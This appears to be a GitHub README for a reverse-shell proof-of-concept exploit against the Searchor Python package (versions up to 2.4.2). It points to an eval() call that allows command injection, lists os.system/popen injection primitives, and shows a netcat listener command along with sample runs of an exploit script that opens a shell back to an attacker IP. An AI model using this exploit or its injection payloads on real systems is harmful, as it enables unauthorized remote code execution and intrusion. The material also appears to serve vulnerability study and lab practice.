
# POC exploit for Searchor <= 2.4.2 (2.4.0) (Arbitrary CMD Injection)
Reverse Shell POC exploit for **`Searchor <= 2.4.2 (2.4.0)`**

See for small details about the vulnerability [**here**](https://security.snyk.io/package/pip/searchor/2.4.0)

[**Link**](https://github.com/ArjunSharda/Searchor) for Github project of Searchor

## Small explanation
In file **`src/sarchor/main.py`** of **`Searchor <= 2.4.2`** there is a function call **`eval()`**:
```python
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval( # <<< See here 
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
	  ...
```
Which can provide the ability to execute arbitrary code using functions such as:
* `__import__('os').system('<CMD>')`
* `__import__('os').popen('<CMD>').read() `
* `etc`

## PoC

Run the netcat on your host:
``` 
$ nc -lvnp 9001
``` 

Run the exploit (example) with default port **`9001`** on attacker host:
``` 
$ ./exploit.sh site.com 10.10.14.122
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is site.com
[*] Input attacker is 10.10.14.122:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```
Run the exploit (example) with the specified port **`1337`** on attacker host:
``` 
$ ./exploit.sh site.com 10.10.14.122 1337
---[Reverse Shell Exploit for Searchor <= 2.4.2 (2.4.0)]---
[*] Input target is site.com
[*] Input attacker is 10.10.14.122:1337
[*] Run the Reverse Shell... Press Ctrl+C after successful connection
```
